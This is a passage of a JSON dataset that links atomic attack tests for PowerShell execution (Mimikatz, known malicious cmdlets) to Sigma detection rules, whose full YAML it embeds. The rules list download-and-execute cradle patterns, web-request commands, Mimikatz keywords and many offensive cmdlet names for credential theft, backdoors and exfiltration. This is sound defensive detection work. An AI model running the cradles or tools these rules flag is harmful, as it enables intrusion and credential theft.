                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Any Powershell DownloadString",
                        "rule_link": "https://research.splunk.com/endpoint/4d015ef2-7adf-11eb-95da-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1059.001",
                "atomic_attack_guid": "f3132740-55bc-48c4-bcc0-758a459cd027",
                "atomic_attack_name": "Mimikatz",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "PowerShell Download and Execution Cradles",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
                        "remote_content": "title: PowerShell Download and Execution Cradles\nid: 85b0b087-eddf-4a2b-b033-d771fa2b9775\nstatus: test\ndescription: Detects PowerShell download and execution cradles.\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-05-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_download:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    selection_iex:\n        CommandLine|contains:\n            - ';iex $'\n            - '| IEX'\n            - '|IEX '\n            - 'I`E`X'\n            - 'I`EX'\n            - 'IE`X'\n            - 'iex '\n            - 'IEX ('\n            - 'IEX('\n            - 'Invoke-Expression'\n    condition: all of selection_*\nfalsepositives:\n    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
                        "remote_content": "title: Suspicious PowerShell Invocations - Specific - ProcessCreation\nid: 536e2947-3729-478c-9903-745aaffe60d2\nrelated:\n    - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n      type: obsolete\n    - id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\n      type: similar\n    - id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\n      type: similar\nstatus: test\ndescription: Detects suspicious PowerShell invocation command parameters\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-05\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Suspicious Program Names",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_progname.yml",
                        "remote_content": "title: Suspicious Program Names\nid: efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6\nstatus: test\ndescription: Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-11\nmodified: 2023-03-22\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_image:\n        - Image|contains:\n              - '\\CVE-202' # Update this when we reach the year 2100\n              - '\\CVE202' # Update this when we reach the year 2100\n        - Image|endswith:\n              - '\\poc.exe'\n              - '\\artifact.exe'\n              - '\\artifact64.exe'\n              - '\\artifact_protected.exe'\n              - '\\artifact32.exe'\n              - '\\artifact32big.exe'\n              - 'obfuscated.exe'\n              - 'obfusc.exe'\n              - '\\meterpreter'\n    selection_commandline:\n        CommandLine|contains:\n            - 'inject.ps1'\n            - 'Invoke-CVE'\n            - 'pupy.ps1'\n            - 'payload.ps1'\n            - 'beacon.ps1'\n            - 'PowerView.ps1'\n            - 'bypass.ps1'\n            - 'obfuscated.ps1'\n            - 'obfusc.ps1'\n            - 'obfus.ps1'\n            - 'obfs.ps1'\n            - 'evil.ps1'\n            - 'MiniDogz.ps1'\n            - '_enc.ps1'\n            - '\\shell.ps1'\n            - '\\rshell.ps1'\n            - 'revshell.ps1'\n            - '\\av.ps1'\n            - '\\av_test.ps1'\n            - 'adrecon.ps1'\n            - 'mimikatz.ps1'\n            - '\\PowerUp_'\n            - 'powerup.ps1'\n            - '\\Temp\\a.ps1'\n            - '\\Temp\\p.ps1'\n            - '\\Temp\\1.ps1'\n            - 'Hound.ps1'\n            - 'encode.ps1'\n            - 'powercat.ps1'\n    condition: 1 of selection*\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - CurrentDirectory\nfalsepositives:\n    - Legitimate tools that accidentally match on the searched patterns\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious PowerShell Download and Execute Pattern",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_susp_download_patterns.yml",
                        "remote_content": "title: Suspicious PowerShell Download and Execute Pattern\nid: e6c54d94-498c-4562-a37c-b469d8e9a275\nrelated:\n    - id: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\n      type: derived\nstatus: test\ndescription: Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)\nreferences:\n    - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70\n    - https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-28\nmodified: 2022-03-01\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: # make sure that your backend applies the strings case-insensitive\n            - 'IEX ((New-Object Net.WebClient).DownloadString'\n            - 'IEX (New-Object Net.WebClient).DownloadString'\n            - 'IEX((New-Object Net.WebClient).DownloadString'\n            - 'IEX(New-Object Net.WebClient).DownloadString'\n            - ' -command (New-Object System.Net.WebClient).DownloadFile('\n            - ' -c (New-Object System.Net.WebClient).DownloadFile('\n    condition: selection\nfalsepositives:\n    - Software installers that pull packages from remote systems and execute them\nlevel: high\n"
                    },
                    {
                        "rule_name": "Malicious PowerShell Commandlets - ProcessCreation",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_malicious_cmdlets.yml",
                        "remote_content": "title: Malicious PowerShell Commandlets - ProcessCreation\nid: 02030f2f-6199-49ec-b258-ea71b07e03dc\nrelated:\n    - id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n      type: derived\n    - id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n      type: similar\nstatus: test\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\nreferences:\n    - https://adsecurity.org/?p=2921\n    - https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n    - https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n    - https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n    - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n    - https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n    - https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/ # Invoke-TotalExec\n    - https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/ # Invoke-TotalExec\n    - https://github.com/calebstewart/CVE-2021-1675 # Invoke-Nightmare\n    - https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n    - https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n    - https://github.com/HarmJ0y/DAMP\n    - https://github.com/samratashok/nishang\n    - https://github.com/DarkCoderSc/PowerRunAsSystem/\n    - https://github.com/besimorhino/powercat\n    - https://github.com/Kevin-Robertson/Powermad\n    - https://github.com/adrecon/ADRecon\n    - https://github.com/adrecon/AzureADRecon\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\nmodified: 2024-01-25\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1482\n    - attack.t1087\n    - attack.t1087.001\n    - attack.t1087.002\n    - attack.t1069.001\n    - attack.t1069.002\n    - attack.t1069\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Note: Please ensure alphabetical order when adding new entries\n        CommandLine|contains:\n            - 'Add-Exfiltration'\n            - 'Add-Persistence'\n            - 'Add-RegBackdoor'\n            - 'Add-RemoteRegBackdoor'\n            - 'Add-ScrnSaveBackdoor'\n            - 'Check-VM'\n            - 'ConvertTo-Rc4ByteStream'\n            - 'Decrypt-Hash'\n            - 'Disable-ADIDNSNode'\n            - 'Disable-MachineAccount'\n            - 'Do-Exfiltration'\n            - 'Enable-ADIDNSNode'\n            - 'Enable-MachineAccount'\n            - 'Enabled-DuplicateToken'\n            - 'Exploit-Jboss'\n            - 'Export-ADR'\n            - 'Export-ADRCSV'\n            - 'Export-ADRExcel'\n            - 'Export-ADRHTML'\n            - 'Export-ADRJSON'\n            - 'Export-ADRXML'\n            - 'Find-Fruit'\n            - 'Find-GPOLocation'\n            - 'Find-TrustedDocuments'\n            - 'Get-ADIDNS' # Covers: Get-ADIDNSNodeAttribute, Get-ADIDNSNodeOwner, Get-ADIDNSNodeTombstoned, Get-ADIDNSPermission, Get-ADIDNSZone\n            - 'Get-ApplicationHost'\n            - 'Get-ChromeDump'\n            - 'Get-ClipboardContents'\n            - 'Get-FoxDump'\n            - 'Get-GPPPassword'\n            - 'Get-IndexedItem'\n            - 'Get-KerberosAESKey'\n            - 'Get-Keystrokes'\n            - 'Get-LSASecret'\n            - 'Get-MachineAccountAttribute'\n            - 'Get-MachineAccountCreator'\n            - 'Get-PassHashes'\n            - 'Get-RegAlwaysInstallElevated'\n            - 'Get-RegAutoLogon'\n            - 'Get-RemoteBootKey'\n            - 'Get-RemoteCachedCredential'\n            - 'Get-RemoteLocalAccountHash'\n            - 'Get-RemoteLSAKey'\n            - 'Get-RemoteMachineAccountHash'\n            - 'Get-RemoteNLKMKey'\n            - 'Get-RickAstley'\n            - 'Get-Screenshot'\n            - 'Get-SecurityPackages'\n            - 'Get-ServiceFilePermission'\n            - 'Get-ServicePermission'\n            - 'Get-ServiceUnquoted'\n            - 'Get-SiteListPassword'\n            - 'Get-System'\n            - 'Get-TimedScreenshot'\n            - 'Get-UnattendedInstallFile'\n            - 'Get-Unconstrained'\n            - 'Get-USBKeystrokes'\n            - 'Get-VaultCredential'\n            - 'Get-VulnAutoRun'\n            - 'Get-VulnSchTask'\n            - 'Grant-ADIDNSPermission'\n            - 'Gupt-Backdoor'\n            - 'HTTP-Login'\n            - 'Install-ServiceBinary'\n            - 'Install-SSP'\n            - 'Invoke-ACLScanner'\n            - 'Invoke-ADRecon'\n            - 'Invoke-ADSBackdoor'\n            - 'Invoke-AgentSmith'\n            - 'Invoke-AllChecks'\n            - 'Invoke-ARPScan'\n            - 'Invoke-AzureHound'\n            - 'Invoke-BackdoorLNK'\n            - 'Invoke-BadPotato'\n            - 'Invoke-BetterSafetyKatz'\n            - 'Invoke-BypassUAC'\n            - 'Invoke-Carbuncle'\n            - 'Invoke-Certify'\n            - 'Invoke-ConPtyShell'\n            - 'Invoke-CredentialInjection'\n            - 'Invoke-DAFT'\n            - 'Invoke-DCSync'\n            - 'Invoke-DinvokeKatz'\n            - 'Invoke-DllInjection'\n            - 'Invoke-DNSUpdate'\n            - 'Invoke-DomainPasswordSpray'\n            - 'Invoke-DowngradeAccount'\n            - 'Invoke-EgressCheck'\n            - 'Invoke-Eyewitness'\n            - 'Invoke-FakeLogonScreen'\n            - 'Invoke-Farmer'\n            - 'Invoke-Get-RBCD-Threaded'\n            - 'Invoke-Gopher'\n            - 'Invoke-Grouper' # Also Covers Invoke-GrouperX\n            - 'Invoke-HandleKatz'\n            - 'Invoke-ImpersonatedProcess'\n            - 'Invoke-ImpersonateSystem'\n            - 'Invoke-InteractiveSystemPowerShell'\n            - 'Invoke-Internalmonologue'\n            - 'Invoke-Inveigh'\n            - 'Invoke-InveighRelay'\n            - 'Invoke-KrbRelay'\n            - 'Invoke-LdapSignCheck'\n            - 'Invoke-Lockless'\n            - 'Invoke-MalSCCM'\n            - 'Invoke-Mimikatz'\n            - 'Invoke-Mimikittenz'\n            - 'Invoke-MITM6'\n            - 'Invoke-NanoDump'\n            - 'Invoke-NetRipper'\n            - 'Invoke-Nightmare'\n            - 'Invoke-NinjaCopy'\n            - 'Invoke-OfficeScrape'\n            - 'Invoke-OxidResolver'\n            - 'Invoke-P0wnedshell'\n            - 'Invoke-Paranoia'\n            - 'Invoke-PortScan'\n            - 'Invoke-PoshRatHttp' # Also Covers Invoke-PoshRatHttps\n            - 'Invoke-PostExfil'\n            - 'Invoke-PowerDump'\n            - 'Invoke-PowerShellTCP'\n            - 'Invoke-PowerShellWMI'\n            - 'Invoke-PPLDump'\n            - 'Invoke-PsExec'\n            - 'Invoke-PSInject'\n            - 'Invoke-PsUaCme'\n            - 'Invoke-ReflectivePEInjection'\n            - 'Invoke-ReverseDNSLookup'\n            - 'Invoke-Rubeus'\n            - 'Invoke-RunAs'\n            - 'Invoke-SafetyKatz'\n            - 'Invoke-SauronEye'\n            - 'Invoke-SCShell'\n            - 'Invoke-Seatbelt'\n            - 'Invoke-ServiceAbuse'\n            - 'Invoke-ShadowSpray'\n            - 'Invoke-Sharp' # Covers all \"Invoke-Sharp\" variants\n            - 'Invoke-Shellcode'\n            - 'Invoke-SMBScanner'\n            - 'Invoke-Snaffler'\n            - 'Invoke-Spoolsample'\n            - 'Invoke-SpraySinglePassword'\n            - 'Invoke-SSHCommand'\n            - 'Invoke-StandIn'\n            - 'Invoke-StickyNotesExtract'\n            - 'Invoke-SystemCommand'\n            - 'Invoke-Tasksbackdoor'\n            - 'Invoke-Tater'\n            - 'Invoke-Thunderfox'\n            - 'Invoke-ThunderStruck'\n            - 'Invoke-TokenManipulation'\n            - 'Invoke-Tokenvator'\n            - 'Invoke-TotalExec'\n            - 'Invoke-UrbanBishop'\n            - 'Invoke-UserHunter'\n            - 'Invoke-VoiceTroll'\n            - 'Invoke-Whisker'\n            - 'Invoke-WinEnum'\n            - 'Invoke-winPEAS'\n            - 'Invoke-WireTap'\n            - 'Invoke-WmiCommand'\n            - 'Invoke-WMIExec'\n            - 'Invoke-WScriptBypassUAC'\n            - 'Invoke-Zerologon'\n            - 'MailRaider'\n            - 'New-ADIDNSNode'\n            - 'New-DNSRecordArray'\n            - 'New-HoneyHash'\n            - 'New-InMemoryModule'\n            - 'New-MachineAccount'\n            - 'New-SOASerialNumberArray'\n            - 'Out-Minidump'\n            - 'Port-Scan'\n            - 'PowerBreach'\n            - 'powercat '\n            - 'PowerUp'\n            - 'PowerView'\n            - 'Remove-ADIDNSNode'\n            - 'Remove-MachineAccount'\n            - 'Remove-Update'\n            - 'Rename-ADIDNSNode'\n            - 'Revoke-ADIDNSPermission'\n            - 'Set-ADIDNSNode' # Covers: Set-ADIDNSNodeAttribute, Set-ADIDNSNodeOwner\n            - 'Set-MacAttribute'\n            - 'Set-MachineAccountAttribute'\n            - 'Set-Wallpaper'\n            - 'Show-TargetScreen'\n            - 'Start-CaptureServer'\n            - 'Start-Dnscat2'\n            - 'Start-WebcamRecorder'\n            - 'VolumeShadowCopyTools'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    },
                    {
                        "rule_name": "HackTool - Mimikatz Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml",
                        "remote_content": "title: HackTool - Mimikatz Execution\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\nstatus: test\ndescription: Detection well-known mimikatz command line arguments\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://tools.thehacker.recipes/mimikatz/modules\nauthor: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim Shelton\ndate: 2019-10-22\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.t1003.001\n    - attack.t1003.002\n    - attack.t1003.004\n    - attack.t1003.005\n    - attack.t1003.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tools_name:\n        CommandLine|contains:\n            - 'DumpCreds'\n            - 'mimikatz'\n    selection_function_names: # To cover functions from modules that are not in module_names\n        CommandLine|contains:\n            - '::aadcookie' # misc module\n            - '::detours' # misc module\n            - '::memssp' # misc module\n            - '::mflt' # misc module\n            - '::ncroutemon' # misc module\n            - '::ngcsign' # misc module\n            - '::printnightmare' # misc module\n            - '::skeleton' # misc module\n            - '::preshutdown'  # service module\n            - '::mstsc'  # ts module\n            - '::multirdp'  # ts module\n    selection_module_names:\n        CommandLine|contains:\n            - 'rpc::'\n            - 'token::'\n            - 'crypto::'\n            - 'dpapi::'\n            - 'sekurlsa::'\n            - 'kerberos::'\n            - 'lsadump::'\n            - 'privilege::'\n            - 'process::'\n            - 'vault::'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    },
                    {
                        "rule_name": "PowerShell Web Download",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
                    },
                    {
                        "rule_name": "PowerShell Download Pattern",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml",
                        "remote_content": "title: PowerShell Download Pattern\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nrelated:\n    - id: e6c54d94-498c-4562-a37c-b469d8e9a275\n      type: derived\nstatus: test\ndescription: Detects a Powershell process that contains download commands in its command line string\nreferences:\n    - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html\n    - https://lab52.io/blog/winter-vivern-all-summer/\n    - https://hatching.io/blog/powershell-analysis/\nauthor: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019-01-16\nmodified: 2023-01-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'new-object'\n            - 'net.webclient).'\n            - 'download'\n        CommandLine|contains:\n            - 'string('\n            - 'file('\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Any Powershell DownloadString",
                        "rule_link": "https://research.splunk.com/endpoint/4d015ef2-7adf-11eb-95da-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1059.001",
                "atomic_attack_guid": "49eb9404-5e0f-4031-a179-b40f7be385e3",
                "atomic_attack_name": "PowerShell Invoke Known Malicious Cmdlets",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Malicious PowerShell Commandlets - ProcessCreation",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_malicious_cmdlets.yml",
                        "remote_content": "title: Malicious PowerShell Commandlets - ProcessCreation\nid: 02030f2f-6199-49ec-b258-ea71b07e03dc\nrelated:\n    - id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n      type: derived\n    - id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n      type: similar\nstatus: test\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\nreferences:\n    - https://adsecurity.org/?p=2921\n    - https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n    - https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n    - https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n    - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n    - https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n    - https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/ # Invoke-TotalExec\n    - https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/ # Invoke-TotalExec\n    - https://github.com/calebstewart/CVE-2021-1675 # Invoke-Nightmare\n    - https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n    - https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n    - https://github.com/HarmJ0y/DAMP\n    - https://github.com/samratashok/nishang\n    - https://github.com/DarkCoderSc/PowerRunAsSystem/\n    - https://github.com/besimorhino/powercat\n    - https://github.com/Kevin-Robertson/Powermad\n    - https://github.com/adrecon/ADRecon\n    - https://github.com/adrecon/AzureADRecon\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\nmodified: 2024-01-25\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1482\n    - attack.t1087\n    - attack.t1087.001\n    - attack.t1087.002\n    - attack.t1069.001\n    - attack.t1069.002\n    - attack.t1069\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Note: Please ensure alphabetical order when adding new entries\n        CommandLine|contains:\n            - 'Add-Exfiltration'\n            - 'Add-Persistence'\n            - 'Add-RegBackdoor'\n            - 'Add-RemoteRegBackdoor'\n            - 'Add-ScrnSaveBackdoor'\n            - 'Check-VM'\n            - 'ConvertTo-Rc4ByteStream'\n            - 'Decrypt-Hash'\n            - 'Disable-ADIDNSNode'\n            - 'Disable-MachineAccount'\n            - 'Do-Exfiltration'\n            - 'Enable-ADIDNSNode'\n            - 'Enable-MachineAccount'\n            - 'Enabled-DuplicateToken'\n            - 'Exploit-Jboss'\n            - 'Export-ADR'\n            - 'Export-ADRCSV'\n            - 'Export-ADRExcel'\n            - 'Export-ADRHTML'\n            - 'Export-ADRJSON'\n            - 'Export-ADRXML'\n            - 'Find-Fruit'\n            - 'Find-GPOLocation'\n            - 'Find-TrustedDocuments'\n            - 'Get-ADIDNS' # Covers: Get-ADIDNSNodeAttribute, Get-ADIDNSNodeOwner, Get-ADIDNSNodeTombstoned, Get-ADIDNSPermission, Get-ADIDNSZone\n            - 'Get-ApplicationHost'\n            - 'Get-ChromeDump'\n            - 'Get-ClipboardContents'\n            - 'Get-FoxDump'\n            - 'Get-GPPPassword'\n            - 'Get-IndexedItem'\n            - 'Get-KerberosAESKey'\n            - 'Get-Keystrokes'\n            - 'Get-LSASecret'\n            - 'Get-MachineAccountAttribute'\n            - 'Get-MachineAccountCreator'\n            - 'Get-PassHashes'\n            - 'Get-RegAlwaysInstallElevated'\n            - 'Get-RegAutoLogon'\n            - 'Get-RemoteBootKey'\n            - 'Get-RemoteCachedCredential'\n            - 'Get-RemoteLocalAccountHash'\n            - 'Get-RemoteLSAKey'\n            - 'Get-RemoteMachineAccountHash'\n            - 'Get-RemoteNLKMKey'\n            - 'Get-RickAstley'\n            - 'Get-Screenshot'\n            - 'Get-SecurityPackages'\n            - 'Get-ServiceFilePermission'\n            - 'Get-ServicePermission'\n            - 'Get-ServiceUnquoted'\n            - 'Get-SiteListPassword'\n            - 'Get-System'\n            - 'Get-TimedScreenshot'\n            - 'Get-UnattendedInstallFile'\n            - 'Get-Unconstrained'\n            - 'Get-USBKeystrokes'\n            - 'Get-VaultCredential'\n            - 'Get-VulnAutoRun'\n            - 'Get-VulnSchTask'\n            - 'Grant-ADIDNSPermission'\n            - 'Gupt-Backdoor'\n            - 'HTTP-Login'\n            - 'Install-ServiceBinary'\n            - 'Install-SSP'\n            - 